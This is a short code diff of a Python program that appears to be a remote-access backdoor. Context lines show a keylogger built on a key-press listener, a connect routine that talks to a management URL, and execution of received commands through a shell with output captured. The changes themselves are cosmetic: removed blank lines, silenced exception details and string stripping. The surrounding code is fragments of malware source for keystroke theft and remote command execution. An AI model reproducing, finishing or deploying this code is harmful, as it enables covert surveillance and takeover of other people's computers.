@@ -69,8 +69,6 @@ def enableKeylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-
-
 def connect(url,managementURL):
 
     screenshotwarning = False
@@ -168,8 +166,8 @@ def connect(url,managementURL):
 
     except Exception as e:
         #print(e)
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        #exc_type, exc_obj, exc_tb = sys.exc_info()
+        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
         #print(exc_type, fname, exc_tb.tb_lineno)
         pass
 
@@ -251,7 +249,7 @@ def connect(url,managementURL):
             else:
                 output = subprocess.check_output(command, shell=True)
                 time.sleep(.5)
-                output = output.decode('UTF-8').rstrip()
+                output = output.decode('UTF-8').strip()
 
             #print("Output: " + output)
             output = output.lstrip().strip()
